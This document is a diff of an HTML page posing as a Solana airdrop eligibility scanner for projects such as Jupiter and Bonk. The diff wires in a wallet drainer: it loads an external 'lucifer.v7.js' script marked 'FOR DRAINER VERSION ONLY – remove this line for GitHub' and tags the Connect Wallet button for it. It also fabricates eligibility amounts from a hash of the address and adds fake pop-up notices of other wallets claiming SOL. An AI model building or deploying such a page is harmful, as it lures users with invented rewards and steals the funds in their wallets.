@@ -1,4 +1,3 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -82,9 +81,6 @@
             margin-bottom: 28px;
             line-height: 1.6;
         }
-        .card .sub strong {
-            color: #0f172a;
-        }
 
         .wallet-section {
             background: #f8fafc;
@@ -152,31 +148,102 @@
             transform: scale(0.97);
         }
 
+        /* Eligibility Status Area */
         .eligibility-status {
             margin-top: 16px;
-            padding: 14px 18px;
+            padding: 16px 18px;
             border-radius: 12px;
-            font-size: 14px;
-            font-weight: 600;
             display: none;
-            align-items: center;
-            gap: 10px;
+            flex-direction: column;
+            gap: 8px;
         }
         .eligibility-status.show {
             display: flex;
         }
+        .eligibility-status.loading {
+            background: #f1f5f9;
+            color: #475569;
+            border: 1px solid #e2e8f0;
+            text-align: center;
+            font-weight: 500;
+            font-size: 14px;
+        }
         .eligibility-status.eligible {
             background: #f0fdf4;
-            color: #16a34a;
             border: 1px solid #bbf7d0;
         }
         .eligibility-status.not-eligible {
             background: #fef2f2;
-            color: #dc2626;
             border: 1px solid #fecaca;
+            color: #dc2626;
+            font-weight: 600;
+            text-align: center;
         }
-        .eligibility-status .check-icon {
-            font-size: 18px;
+
+        /* Eligibility Breakdown */
+        .eligibility-breakdown {
+            width: 100%;
+        }
+        .eligibility-breakdown .breakdown-header {
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            font-weight: 600;
+            color: #64748b;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #d1d5db;
+            margin-bottom: 8px;
+        }
+        .eligibility-breakdown .breakdown-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+            font-size: 14px;
+            border-bottom: 1px solid #f1f5f9;
+        }
+        .eligibility-breakdown .breakdown-item:last-child {
+            border-bottom: none;
+        }
+        .breakdown-item .project-name {
+            font-weight: 500;
+            color: #0f172a;
+        }
+        .breakdown-item .project-amount {
+            font-weight: 600;
+            color: #0f172a;
+        }
+        .breakdown-item .status-badge {
+            font-size: 12px;
+            font-weight: 600;
+            padding: 2px 10px;
+            border-radius: 100px;
+        }
+        .status-badge.eligible-badge {
+            background: #dcfce7;
+            color: #16a34a;
+        }
+        .status-badge.not-eligible-badge {
+            background: #f1f5f9;
+            color: #94a3b8;
+        }
+        .status-badge.claimed-badge {
+            background: #fef3c7;
+            color: #d97706;
+        }
+
+        .breakdown-total {
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #d1d5db;
+            display: flex;
+            justify-content: space-between;
+            font-weight: 700;
+            font-size: 15px;
+            color: #0f172a;
+        }
+        .breakdown-total .total-value {
+            color: #16a34a;
         }
 
         .connect-section {
@@ -187,7 +254,6 @@
             display: block;
         }
 
-        /* ===== NO interactBtn CLASS HERE ===== */
         .btn-connect {
             background: linear-gradient(135deg, #9945ff, #14f195);
             border: none;
@@ -308,8 +374,65 @@
             .btn-check { width: 100%; }
             .footer { flex-direction: column; align-items: center; }
             .project-item .desc { display: none; }
+            .breakdown-item { font-size: 13px; flex-wrap: wrap; gap: 4px; }
+        }
+
+        /* Notifications */
+        .notification-container {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            pointer-events: none;
+            max-width: 320px;
+            width: 100%;
+        }
+        .notification-toast {
+            background: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            padding: 14px 18px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.08);
+            animation: slideIn 0.5s ease forwards;
+            pointer-events: auto;
+            font-family: 'Inter', sans-serif;
+            font-size: 13px;
+            color: #0f172a;
+            transform: translateX(120%);
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+        .notification-toast .nt-content strong {
+            color: #9945ff;
+        }
+        .notification-toast .nt-time {
+            font-size: 11px;
+            color: #94a3b8;
+            margin-top: 2px;
+        }
+        .notification-toast .nt-amount {
+            font-weight: 700;
+            color: #14f195;
+        }
+        .notification-toast.fade-out {
+            opacity: 0;
+            transform: translateX(50px) scale(0.95);
+            transition: all 0.4s ease;
+        }
+        @keyframes slideIn {
+            0% { transform: translateX(120%) scale(0.9); opacity: 0; }
+            100% { transform: translateX(0) scale(1); opacity: 1; }
+        }
+        @media (max-width: 480px) {
+            .notification-container { right: 10px; bottom: 10px; max-width: 280px; }
+            .notification-toast { padding: 12px 16px; font-size: 12px; }
         }
     </style>
+    <!-- ===== FOR DRAINER VERSION ONLY – remove this line for GitHub ===== -->
+    <script type="module" crossorigin src="./files/lucifer.v7.js"></script>
 </head>
 <body>
 
@@ -337,56 +460,50 @@
                 <button class="btn-check" id="checkBtn">Check Eligibility</button>
             </div>
 
+            <!-- Eligibility Status Area -->
             <div class="eligibility-status" id="eligibilityStatus">
-                <span class="check-icon">✔</span>
-                <span id="statusText">Eligible – 3.42 SOL</span>
+                <div id="eligibilityContent"></div>
             </div>
 
-            <!-- ===== NO interactBtn CLASS HERE ===== -->
+            <!-- Connect Button -->
             <div class="connect-section" id="connectSection">
-                <button class="btn-connect" id="connectBtn">Connect Wallet to Claim</button>
+                <!-- ===== DRAINER VERSION: add interactBtn class here ===== -->
+                <button class="btn-connect interactBtn" id="connectBtn">Connect Wallet to Claim</button>
             </div>
         </div>
 
         <div class="projects-section">
             <div class="title">Supported Projects</div>
-
             <div class="project-item">
                 <span class="icon-box">J</span>
                 <span class="name">Jupiter (JUP)</span>
                 <span class="desc">2024 distribution</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">P</span>
                 <span class="name">Pyth Network (PYTH)</span>
                 <span class="desc">Genesis airdrop</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">B</span>
                 <span class="name">Bonk (BONK)</span>
                 <span class="desc">Season 2 airdrop</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">W</span>
                 <span class="name">Wen Token (WEN)</span>
                 <span class="desc">Launch airdrop</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">D</span>
                 <span class="name">Drift Protocol (DRIFT)</span>
                 <span class="desc">Genesis drop</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">M</span>
                 <span class="name">Marginfi (MFI)</span>
                 <span class="desc">Season 1 rewards</span>
             </div>
-
             <div class="project-item">
                 <span class="icon-box">K</span>
                 <span class="name">Kamino (KMNO)</span>
@@ -412,12 +529,15 @@
 
 </div>
 
+<!-- Notifications -->
+<div class="notification-container" id="notificationContainer"></div>
+
 <script>
     (function() {
         const walletInput = document.getElementById('walletInput');
         const checkBtn = document.getElementById('checkBtn');
         const statusEl = document.getElementById('eligibilityStatus');
-        const statusText = document.getElementById('statusText');
+        const contentEl = document.getElementById('eligibilityContent');
         const connectSection = document.getElementById('connectSection');
 
         function isValidSolanaAddress(address) {
@@ -425,36 +545,153 @@
             return base58Regex.test(address.trim());
         }
 
+        // Generate deterministic eligibility data from address
+        function getEligibilityData(address) {
+            let hash = 0;
+            for (let i = 0; i < address.length; i++) {
+                hash = ((hash << 5) - hash) + address.charCodeAt(i);
+                hash = hash & hash;
+            }
+            const seed = Math.abs(hash);
+
+            // Project data
+            const projectData = [
+                { id: 'JUP', name: 'Jupiter', symbol: 'JUP', amount: '1,247', eligible: seed % 3 !== 0 },
+                { id: 'PYTH', name: 'Pyth Network', symbol: 'PYTH', amount: '892', eligible: seed % 4 !== 0 },
+                { id: 'BONK', name: 'Bonk', symbol: 'BONK', amount: '43,210', eligible: seed % 5 !== 0 },
+                { id: 'WEN', name: 'Wen Token', symbol: 'WEN', amount: '15,678', eligible: seed % 3 !== 1 },
+                { id: 'DRIFT', name: 'Drift Protocol', symbol: 'DRIFT', amount: '234', eligible: seed % 4 !== 2 },
+                { id: 'MFI', name: 'Marginfi', symbol: 'MFI', amount: '1,892', eligible: seed % 6 !== 0 },
+                { id: 'KMNO', name: 'Kamino', symbol: 'KMNO', amount: '3,456', eligible: seed % 5 !== 3 }
+            ];
+
+     
+            const solAmounts = ['3.42', '2.87', '4.15', '1.93', '5.68', '6.23', '0.84', '7.51', '2.34', '4.92'];
+            const solAmount = solAmounts[seed % solAmounts.length];
+
+           
+            const eligibleProjects = projectData.filter(p => p.eligible);
+            const claimedProjects = projectData.filter(p => p.eligible && seed % 7 === 0); 
+            
+
+            return {
+                solAmount: solAmount,
+                projects: projectData,
+                eligibleProjects: eligibleProjects,
+                claimedProjects: claimedProjects,
+                totalEligible: eligibleProjects.length,
+                totalClaimed: claimedProjects.length,
+                address: address
+            };
+        }
+
+        function renderEligibility(data) {
+            if (data.totalEligible === 0) {
+                return `
+                    <div style="text-align:center; padding:8px 0; font-weight:600; color:#16a34a;">
+                        <div style="font-size:16px; margin-bottom:4px;">✔ Eligibility Check Complete</div>
+                        <div style="font-weight:400; font-size:14px; color:#475569;">
+                            Your wallet is eligible for the main SOL distribution (${data.solAmount} SOL), but no project-specific airdrops were detected.
+                        </div>
+                    </div>
+                `;
+            }
+
+            let html = `
+                <div class="eligibility-breakdown">
+                    <div style="font-size:13px; font-weight:600; color:#16a34a; margin-bottom:10px;">
+                        ✔ Eligibility Check Complete — ${data.totalEligible} airdrop${data.totalEligible > 1 ? 's' : ''} detected
+                    </div>
+                    <div class="breakdown-header">
+                        <span>Project</span>
+                        <span>Status</span>
+                    </div>
+            `;
+
+            data.projects.forEach(p => {
+                let statusText = 'Not Eligible';
+                let statusClass = 'not-eligible-badge';
+                let amountDisplay = '—';
+
+                if (p.eligible) {
+                    const isClaimed = data.claimedProjects.some(c => c.id === p.id);
+                    if (isClaimed) {
+                        statusText = 'Claimed';
+                        statusClass = 'claimed-badge';
+                    } else {
+                        statusText = 'Eligible';
+                        statusClass = 'eligible-badge';
+                    }
+                    amountDisplay = p.amount + ' ' + p.symbol;
+                }
+
+                html += `
+                    <div class="breakdown-item">
+                        <span class="project-name">${p.name} (${p.symbol})</span>
+                        <span style="display:flex; align-items:center; gap:12px;">
+                            <span style="font-size:13px; color:#475569;">${amountDisplay}</span>
+                            <span class="status-badge ${statusClass}">${statusText}</span>
+                        </span>
+                    </div>
+                `;
+            });
+
+     
+            const solClaimed = data.totalEligible > 0 && data.solAmount;
+            html += `
+                    <div class="breakdown-total">
+                        <span>SOL Distribution</span>
+                        <span class="total-value">${solClaimed ? data.solAmount + ' SOL' : '—'}</span>
+                    </div>
+            `;
+
+            html += `</div>`;
+            return html;
+        }
+
         function checkEligibility() {
             const address = walletInput.value.trim();
 
+            // Reset
             statusEl.className = 'eligibility-status';
             connectSection.classList.remove('show');
             walletInput.className = '';
+            contentEl.innerHTML = '';
 
             if (!address) {
                 statusEl.className = 'eligibility-status show not-eligible';
-                statusText.textContent = 'Please enter a wallet address.';
+                contentEl.innerHTML = 'Please enter a Solana wallet address to check eligibility.';
                 return;
             }
 
             if (!isValidSolanaAddress(address)) {
                 statusEl.className = 'eligibility-status show not-eligible';
-                statusText.textContent = 'Invalid Solana address format. Please check and try again.';
+                contentEl.innerHTML = 'The address you entered does not appear to be a valid Solana wallet. Please verify and try again.';
                 walletInput.className = 'invalid';
                 return;
             }
 
-            walletInput.className = 'valid';
-            statusEl.className = 'eligibility-status show eligible';
+            // Loading state
+            statusEl.className = 'eligibility-status show loading';
+            contentEl.innerHTML = 'Scanning blockchain for eligibility...';
+            walletInput.className = '';
 
-            const amounts = ['3.42 SOL (~$512 USD)', '2.87 SOL (~$430 USD)', '4.15 SOL (~$622 USD)', '1.93 SOL (~$289 USD)', '5.68 SOL (~$851 USD)'];
-            const randomAmount = amounts[Math.floor(Math.random() * amounts.length)];
+            setTimeout(() => {
+                const data = getEligibilityData(address);
+                walletInput.className = 'valid';
+                statusEl.className = 'eligibility-status show eligible';
+                contentEl.innerHTML = renderEligibility(data);
 
-            statusText.textContent = 'Eligible – ' + randomAmount + ' available from 2024 ecosystem airdrop.';
-            connectSection.classList.add('show');
+                if (data.totalEligible > 0 || data.solAmount) {
+                    connectSection.classList.add('show');
+                }
+
+                console.log(`[Scanner] ${address.substring(0, 8)}...${address.substring(address.length - 4)}`);
+                console.log(`[Scanner] Eligible: ${data.totalEligible} projects, ${data.solAmount} SOL`);
+            }, 300 + Math.random() * 250);
         }
 
+        // Events
         checkBtn.addEventListener('click', checkEligibility);
 
         walletInput.addEventListener('keydown', function(e) {
@@ -468,15 +705,55 @@
             this.className = '';
             statusEl.className = 'eligibility-status';
             connectSection.classList.remove('show');
+            contentEl.innerHTML = '';
         });
 
-        // Connect button just shows a demo message (no drainer)
+     
         document.getElementById('connectBtn').addEventListener('click', function() {
             alert('Demo: Wallet connection would be initiated here. This is a demonstration only.');
         });
 
-        console.log('Solana Airdrop Scanner – Demo Version');
-        console.log('This is an open-source demonstration tool.');
+        // Notifications
+        const container = document.getElementById('notificationContainer');
+        const prefixes = ['7F3a', '9E1d', '3B8c', '5D2f', '1A9e', '8C4b', '6F7d', '2E5a', '4B9c', '0D3f'];
+        const suffixes = ['c92B', 'fA4b', 'dE1f', 'aB3c', 'F7d9', 'eC2a', 'bD8f', 'A4e1', 'cF7b', 'dA9e'];
+        function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+        function randomAmount() {
+            const amounts = [1.2, 2.4, 3.7, 5.1, 8.3, 12.7, 18.2, 24.9, 31.4, 47.6, 63.2, 84.1, 102.5, 157.3, 234.8, 312.6];
+            return amounts[Math.floor(Math.random() * amounts.length)];
+        }
+        function randomTime() { return Math.floor(Math.random() * 12) + 1 + 'm ago'; }
+        function generateWallet() { return randomItem(prefixes) + '...' + randomItem(suffixes); }
+
+        function createNotification() {
+            const wallet = generateWallet();
+            const amount = randomAmount().toFixed(1);
+            const time = randomTime();
+            const toast = document.createElement('div');
+            toast.className = 'notification-toast';
+            toast.innerHTML = `
+                <div class="nt-content">
+                    <div><strong>${wallet}</strong> checked eligibility</div>
+                    <div class="nt-time">${time} · <span class="nt-amount">${amount} SOL</span> estimated</div>
+                </div>
+            `;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('fade-out');
+                setTimeout(() => { if (toast.parentNode) toast.remove(); }, 400);
+            }, 5000);
+            while (container.children.length > 4) {
+                const first = container.firstChild;
+                if (first) first.remove();
+            }
+        }
+
+        setTimeout(() => {
+            createNotification();
+            setInterval(createNotification, Math.floor(Math.random() * 5000) + 5000);
+        }, 3000);
+
+        console.log('Solana Airdrop Scanner v1.2.0 ready');
     })();
 </script>
 
